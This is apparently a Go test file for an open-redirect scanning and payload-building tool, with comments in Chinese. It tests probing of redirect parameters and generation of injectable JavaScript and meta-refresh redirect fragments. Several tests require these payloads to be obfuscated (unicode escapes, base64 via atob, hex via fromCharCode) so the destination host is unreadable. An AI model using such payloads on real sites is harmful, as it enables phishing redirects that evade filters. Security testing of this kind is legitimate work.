package redirect

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// 編碼植入、命中判定與載荷產生的測試。

func TestEncodeEndpointForms(t *testing.T) {
	endpoint := "https://cb.example.com/land"
	cases := []struct {
		mode     string
		contains string
	}{
		{PayloadEncodingNone, endpoint},
		{PayloadEncodingPercent, "https%3A%2F%2Fcb.example.com%2Fland"},
		{PayloadEncodingDoublePercent, "%253A"},
		{PayloadEncodingBase64, "aHR0cHM6Ly9jYi5leGFtcGxlLmNvbS9sYW5k"},
		{PayloadEncodingBase64URL, "aHR0cHM6Ly9jYi5leGFtcGxlLmNvbS9sYW5k"},
		{PayloadEncodingHex, "68747470733a2f2f63622e6578616d706c652e636f6d2f6c616e64"},
		{PayloadEncodingJSUnicode, `\u0068\u0074\u0074\u0070`},
	}
	for _, tc := range cases {
		got, err := EncodeEndpoint(endpoint, tc.mode)
		if err != nil {
			t.Fatalf("mode %s: %v", tc.mode, err)
		}
		if !strings.Contains(got, tc.contains) {
			t.Fatalf("mode %s: expected to contain %q, got %q", tc.mode, tc.contains, got)
		}
	}
	if _, err := EncodeEndpoint(endpoint, "rot13"); err == nil {
		t.Fatal("expected unsupported encoding to be rejected")
	}
}

func TestDecodeEndpointReversesEncodings(t *testing.T) {
	endpoint := "https://cb.example.com/land"
	for _, mode := range []string{
		PayloadEncodingNone, PayloadEncodingPercent, PayloadEncodingDoublePercent,
		PayloadEncodingBase64, PayloadEncodingBase64URL, PayloadEncodingHex, PayloadEncodingJSUnicode,
	} {
		encoded, err := EncodeEndpoint(endpoint, mode)
		if err != nil {
			t.Fatalf("mode %s: %v", mode, err)
		}
		decoded := DecodeEndpoint(encoded)
		if decoded != endpoint {
			t.Fatalf("mode %s: decode got %q, want %q", mode, decoded, endpoint)
		}
	}
}

func TestIsReflectedAcceptsEncodedPayload(t *testing.T) {
	// 目標站把編碼過的端點解回來跳轉 → Location 是原樣網址 → 仍要算命中。
	location := "https://cb.example.com/land"
	for _, mode := range []string{
		PayloadEncodingPercent, PayloadEncodingDoublePercent,
		PayloadEncodingBase64, PayloadEncodingBase64URL, PayloadEncodingHex, PayloadEncodingJSUnicode,
	} {
		payload, err := EncodeEndpoint("https://cb.example.com/land", mode)
		if err != nil {
			t.Fatalf("mode %s: %v", mode, err)
		}
		if !IsReflected(location, payload) {
			t.Fatalf("mode %s: encoded payload %q should be recognised as reflected", mode, payload)
		}
	}
	// 目標站原樣 echo 編碼字串（不解碼）→ 也是命中。
	encoded, _ := EncodeEndpoint("https://cb.example.com/land", PayloadEncodingPercent)
	if !IsReflected(encoded, encoded) {
		t.Fatal("echoed encoded payload should be recognised as reflected")
	}
	// 別的站不能算命中。
	if IsReflected("https://other.example/land", "https://cb.example.com/land") {
		t.Fatal("unrelated location must not be reflected")
	}
}

func TestVerifyTargetsConfirmsWithEncodedInjection(t *testing.T) {
	// 編碼方式的語意：「payload 是目標自己解碼之後應該看到的值」。
	//
	//   - none：目標解碼後看到 https://cb.example.com/land（一般情況）。
	//   - percent：目標解碼後看到 https%3A%2F%2Fcb.example.com%2Fland，
	//     也就是「目標會解兩層」或「過濾器只解一層」的那種站。
	//
	// URL 建構器本身還會再做一次標準編碼，所以 wire 上是 %253A —— 那正是
	// 雙重解碼站點需要的樣子。
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Query().Get("url") {
		case "https://cb.example.com/land":
			w.Header().Set("Location", "https://cb.example.com/land")
			w.WriteHeader(http.StatusFound)
		case "https%3A%2F%2Fcb.example.com%2Fland":
			// 目標把值解兩層才還原成網址。
			w.Header().Set("Location", "https://cb.example.com/land")
			w.WriteHeader(http.StatusFound)
		default:
			w.WriteHeader(http.StatusOK)
		}
	}))
	defer server.Close()

	plain, err := VerifyTargets(context.Background(), server.Client(), []string{server.URL + "/go"}, BatchOptions{
		Endpoints: []string{"https://cb.example.com/land"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(plain) != 1 || !plain[0].Confirmed {
		t.Fatalf("expected confirmed result with plain injection, got %#v", plain)
	}
	// wire 上的值只被標準編碼一次。
	if !strings.Contains(plain[0].RequestURL, "url=https%3A%2F%2Fcb.example.com%2Fland") {
		t.Fatalf("request url should carry the standard-encoded payload: %q", plain[0].RequestURL)
	}
	if strings.Contains(plain[0].RequestURL, "%253A") {
		t.Fatalf("plain mode must not double-encode: %q", plain[0].RequestURL)
	}

	encoded, err := VerifyTargets(context.Background(), server.Client(), []string{server.URL + "/go"}, BatchOptions{
		Endpoints: []string{"https://cb.example.com/land"},
		Encoding:  PayloadEncodingPercent,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(encoded) != 1 || !encoded[0].Confirmed {
		t.Fatalf("expected confirmed result with percent-encoded injection, got %#v", encoded)
	}
	if !strings.Contains(encoded[0].RequestURL, "url=https%253A%252F%252Fcb.example.com%252Fland") {
		t.Fatalf("request url should carry the encoded payload: %q", encoded[0].RequestURL)
	}
}

func TestVerifyTargetsRecordsOwnParamAndTriedParams(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	// 目標網址本身帶著跳轉參數 next → 那是「站點本來跳轉的方法」。
	results, err := VerifyTargets(context.Background(), server.Client(), []string{server.URL + "/go?next=/home"}, BatchOptions{
		Endpoints: []string{"https://cb.example.com/land"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].OwnParam != "next" {
		t.Fatalf("expected own param next, got %q", results[0].OwnParam)
	}
	// 試過的參數應該是整組候選，不是只有一個。
	if len(results[0].ParamsTried) < 2 {
		t.Fatalf("expected every tried param to be recorded, got %v", results[0].ParamsTried)
	}
	if results[0].ParamsTried[0] != "next" {
		t.Fatalf("site's own param should be tried first, got %v", results[0].ParamsTried)
	}

	// 沒有自帶參數的目標：own_param 應為空，但仍要記錄試過哪些。
	results2, err := VerifyTargets(context.Background(), server.Client(), []string{server.URL + "/"}, BatchOptions{
		Endpoints: []string{"https://cb.example.com/land"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if results2[0].OwnParam != "" {
		t.Fatalf("expected empty own param, got %q", results2[0].OwnParam)
	}
	if len(results2[0].ParamsTried) < 2 {
		t.Fatalf("expected tried params to be recorded, got %v", results2[0].ParamsTried)
	}
}

func TestBuildImplantProducesEncodedPayload(t *testing.T) {
	endpoint := "https://cb.example.com/land"

	result, err := BuildImplant(ImplantOptions{Endpoint: endpoint, Kind: ImplantKindJSRedirect})
	if err != nil {
		t.Fatal(err)
	}
	if result.Fragment != "location.href='https://cb.example.com/land'" {
		t.Fatalf("unexpected plain fragment: %q", result.Fragment)
	}

	unicodeResult, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindJSRedirect, Encoding: PayloadEncodingJSUnicode,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(unicodeResult.Fragment, `\u0068\u0074\u0074\u0070`) {
		t.Fatalf("js_unicode fragment should be escaped: %q", unicodeResult.Fragment)
	}
	if strings.Contains(unicodeResult.Fragment, "cb.example.com") {
		t.Fatalf("js_unicode fragment must not contain the readable host: %q", unicodeResult.Fragment)
	}

	base64Result, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindJSRedirect, Encoding: PayloadEncodingBase64,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(base64Result.Fragment, "atob(") {
		t.Fatalf("base64 fragment should carry a decoder: %q", base64Result.Fragment)
	}

	hexResult, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindJSRedirect, Encoding: PayloadEncodingHex,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(hexResult.Fragment, "String.fromCharCode(") {
		t.Fatalf("hex fragment should carry a decoder: %q", hexResult.Fragment)
	}

	metaResult, err := BuildImplant(ImplantOptions{Endpoint: endpoint, Kind: ImplantKindMetaRefresh})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(metaResult.Fragment, "http-equiv=\"refresh\"") {
		t.Fatalf("unexpected meta fragment: %q", metaResult.Fragment)
	}

	paramResult, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindURLParam, Param: "next", Encoding: PayloadEncodingPercent,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(paramResult.Fragment, "next=https%3A%2F%2Fcb.example.com%2Fland") {
		t.Fatalf("unexpected param fragment: %q", paramResult.Fragment)
	}
}

// 編碼必須對載荷型態有意義：meta refresh 與查詢字串不會解 base64／hex／
// unicode 跳脫，硬生出來只會得到一個不生效的載荷（而且型態會跟要求不符）。
func TestBuildImplantRejectsEncodingsThatKindCannotDecode(t *testing.T) {
	endpoint := "https://cb.example.com/land"

	// meta refresh：瀏覽器直接解析網址 → 只接受 URL 層級編碼。
	for _, encoding := range []string{
		PayloadEncodingBase64, PayloadEncodingBase64URL,
		PayloadEncodingHex, PayloadEncodingJSUnicode,
	} {
		result, err := BuildImplant(ImplantOptions{
			Endpoint: endpoint, Kind: ImplantKindMetaRefresh, Encoding: encoding,
		})
		if err == nil {
			t.Fatalf("meta_refresh 應拒絕 %s 編碼，卻產出 %q", encoding, result.Fragment)
		}
		if !strings.Contains(err.Error(), encoding) {
			t.Fatalf("錯誤訊息應點名被拒絕的編碼 %s：%v", encoding, err)
		}
	}

	// meta refresh + percent 仍然可用，且必須仍是 meta 標籤（不能退化成 JS）。
	metaResult, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindMetaRefresh, Encoding: PayloadEncodingPercent,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(metaResult.Fragment, "http-equiv=\"refresh\"") {
		t.Fatalf("meta refresh 片段必須是 meta 標籤：%q", metaResult.Fragment)
	}
	if strings.Contains(metaResult.Fragment, "location.href") ||
		strings.Contains(metaResult.Fragment, "eval(") {
		t.Fatalf("meta refresh 不該退化成 JS 跳轉：%q", metaResult.Fragment)
	}

	// url_param：站方有可能自己解 base64（這正是「加密植入」想利用的情境），
	// 但查詢字串沒有任何機會解讀 \u0068 跳脫。
	if _, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindURLParam, Encoding: PayloadEncodingJSUnicode,
	}); err == nil {
		t.Fatal("url_param 應拒絕 js_unicode 編碼")
	}
	base64Param, err := BuildImplant(ImplantOptions{
		Endpoint: endpoint, Kind: ImplantKindURLParam, Encoding: PayloadEncodingBase64,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(base64Param.Fragment, "?url=") {
		t.Fatalf("unexpected base64 param fragment: %q", base64Param.Fragment)
	}

	// JS 型態什麼編碼都能用。
	for _, encoding := range PayloadEncodings() {
		for _, kind := range []string{
			ImplantKindJSRedirect, ImplantKindJSWindowOpen, ImplantKindJSLocationReplace,
		} {
			if _, err := BuildImplant(ImplantOptions{
				Endpoint: endpoint, Kind: kind, Encoding: encoding,
			}); err != nil {
				t.Fatalf("%s + %s 應該可用：%v", kind, encoding, err)
			}
		}
	}
}
